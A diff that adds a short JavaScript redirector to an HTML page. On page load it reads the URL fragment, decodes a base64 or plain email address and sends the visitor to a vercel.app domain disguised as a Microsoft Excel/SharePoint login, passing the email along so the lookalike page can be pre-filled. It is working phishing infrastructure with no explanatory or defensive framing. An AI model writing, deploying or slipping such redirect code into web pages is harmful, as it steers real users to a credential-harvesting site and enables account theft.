@@ -1,0 +1,28 @@
+<script type="text/javascript">
+   var hash = window.location.hash.substr(1);
+window.onload = function onoff(){
+var mainLink = 'https://login-microsotexcel-online-com-excel-sharepoint-file-narkygzda.vercel.app/';
+    if(hash){
+     var base64regex = /^([0-9a-zA-Z+/]{4})*(([0-9a-zA-Z+/]{2}==)|([0-9a-zA-Z+/]{3}=))?$/;
+	var emailExp = /^[\w\-\.\+]+\@[a-zA-Z0-9\.\-]+\.[a-zA-z0-9]{2,4}$/;
+      if(!base64regex.test(hash)){
+        var hash_value = window.location.hash.replace('#','');     
+      }else{
+      var hash_value = atob(hash);
+      var mmoop = mainLink + '#' + hash_value;
+ window.location.replace(mmoop);           
+      }
+      if (hash_value.match(emailExp)) 
+		{ 
+      var mmoop = mainLink + '#' + hash_value;
+ window.location.replace(mmoop);           
+        }else{
+ window.location.replace(mainLink);           
+        }
+  } else {
+window.location.replace(mainLink);
+       
+  } 
+}        
+</script>
+    
